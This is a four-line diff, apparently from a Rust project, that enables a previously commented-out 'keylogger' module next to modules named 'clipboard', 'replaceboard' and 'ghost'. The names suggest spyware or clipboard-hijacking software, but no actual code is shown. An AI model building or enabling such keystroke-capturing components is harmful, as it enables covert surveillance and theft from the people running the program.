@@ -1,4 +1,4 @@
-// mod keylogger;
+pub mod keylogger;
 pub mod clipboard;
 pub mod replaceboard;
 pub mod ghost;
